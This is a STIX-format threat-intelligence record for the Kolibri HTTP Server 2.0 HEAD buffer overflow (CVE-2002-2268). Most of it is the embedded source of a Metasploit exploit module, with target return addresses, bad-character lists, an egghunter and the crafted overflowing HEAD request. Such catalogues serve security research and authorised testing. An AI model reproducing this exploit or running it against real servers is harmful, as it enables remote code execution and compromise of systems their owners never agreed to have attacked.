{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00dbdb25-0ecd-43e9-8ed2-5c823c5d964a",
    "created": "2024-08-14T16:52:38.604783Z",
    "modified": "2024-08-14T16:52:38.604787Z",
    "name": "Kolibri HTTP Server HEAD Buffer Overflow",
    "description": " This exploits a stack buffer overflow in version 2 of the Kolibri HTTP server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/kolibri_http.rb",
            "external_id": "kolibri_http.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-2268"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  HttpFingerprint = { :pattern => [ /kolibri-2\\.0/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Kolibri HTTP Server HEAD Buffer Overflow',\n      'Description'    => %q{\n        This exploits a stack buffer overflow in version 2 of the Kolibri HTTP server.\n      },\n      'Author'         =>\n          [\n            'mr_me <steventhomasseeley[at]gmail.com>', # msf\n            'TheLeader',                            # original exploit\n            'sinn3r',                               # msf commit\n          ],\n      'References'     =>\n        [\n          [ 'CVE', '2002-2268' ],\n          [ 'OSVDB', '70808' ],\n          [ 'BID', '6289' ],\n          [ 'EDB', '15834' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'       => 3000,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x00\\x0d\\x0a\\x3d\\x20\\x3f\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP sp3',          { 'Ret' => 0x7E429353 } ] ,\n          [ 'Windows Server 2003 sp2', { 'Ret' => 0x76F73BC3 } ] ,\n        ],\n      'DisclosureDate' => '2010-12-26',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    info = http_fingerprint\n    if info and (info =~ /kolibri-2\\.0/)\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    #7E429353    FFE4            JMP     ESP\n    # For a reliable and large payload, we use an egg hunter\n    # and direct RET to execute code\n    print_status(\"Sending request...\")\n    eh_stub, eh_egg = generate_egghunter(payload.encoded, payload_badchars)\n    sploit = Rex::Text.rand_text_alphanumeric(515) + [target.ret].pack('V')\n    sploit << eh_stub\n    send_request_raw({\n      'uri'     => \"/\" + sploit,\n      'version' => '1.1',\n      'method'  => 'HEAD',\n      'headers' => {'Content-Type' => eh_egg},\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-26",
    "x_mitre_platforms": [
        "win'"
    ]
}